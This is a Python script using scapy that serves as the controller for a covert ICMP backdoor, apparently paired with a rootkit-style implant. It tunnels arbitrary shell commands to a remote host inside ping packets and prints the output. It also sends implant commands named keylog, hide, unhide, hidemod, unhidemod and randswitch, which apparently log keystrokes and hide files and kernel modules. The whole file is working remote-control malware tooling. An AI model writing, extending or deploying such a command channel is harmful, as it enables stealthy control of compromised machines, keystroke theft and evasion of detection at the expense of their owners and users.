import sys
from scapy.all import sr1, IP, ICMP

COMMANDS = ["mycat", "keylog", "hide", "unhide", "hidemod", "unhidemod", "randswitch"]
PWD = "/"


def run_shell(ip):
    while True:
        try:
            command = input(f"{PWD} $ ")
            if not send_request(ip, command):
                print("Shell: something wrong, got no response")
        except KeyboardInterrupt:
            return


def send_request(ip, payload):
    command = payload.split()[0] 
    if command == "myecho":
        payload = payload[len(command) + 1:]
    elif command not in COMMANDS:
        payload = "shell " + payload

    print(payload)
    
    response = sr1(IP(dst=ip)/ICMP()/payload, timeout=1, verbose=0)
    if response is not None:
        message = bytes(response[ICMP].payload).decode()
        if command != "myecho" and command not in COMMANDS:
            message = message.strip("\x00").strip()
            global PWD
            PWD = message.split("\n")[-1]
            message = "\n".join(message.split("\n")[:-1])
        print(message, end="\n")
    return response is not None



def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} IP')
    ip = sys.argv[1]
    if not send_request(ip, "myecho test_echo"):
        print("Shell: test command got no response, exiting...")
        return
    run_shell(ip)
    print("Shell: keyboard interrupt, exiting...")



if __name__ == "__main__":
    main()
